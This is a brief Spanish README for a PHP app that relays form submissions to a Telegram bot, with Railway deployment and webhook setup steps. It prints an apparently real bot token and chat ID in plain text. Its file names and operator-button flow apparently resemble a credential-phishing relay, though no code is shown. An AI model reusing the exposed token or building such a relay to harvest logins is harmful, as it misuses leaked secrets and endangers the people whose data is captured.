# Fala Telegram Bot (PHP)

Proyecto que recibe datos desde formulario y los envía a un bot de Telegram con botones inline y flujo de callback.

## Configuración

- `config.php` usa ENV variables y fallback de valores.

```
BOT_TOKEN=8273427827:AAFkP0yvRIcTpgSKTSSYOHsmvacfIA42rg0
CHAT_ID=-5241462252
```

## Deploy Railway (Docker)

1. Asegúrate de que los archivos están en el repo.
2. Railway detecta `Dockerfile` y usa `railway.json`.
3. `startCommand`: `php -S 0.0.0.0:$PORT -t .`
4. Test:
   - `https://<app>/index.html`
   - `https://<app>/webhook.php` devuelve `OK`

## Telegram webhook

```
https://api.telegram.org/bot$BOT_TOKEN/setWebhook?url=https://<app>.up.railway.app/webhook.php
```

## Ajustes Opcionales para Caddy

- `Caddyfile` ya incluido (para PHP-FPM si se cambia base a `php:fpm`).

## Comandos locales

```
php -S 0.0.0.0:8000 -t .
```

## Archivos importantes

- `index.html`
- `js/ready.js`
- `procesar_logo.php`
- `procesar_dinamica.php`
- `webhook.php`
- `verificar_respuesta.php`
- `config.php`
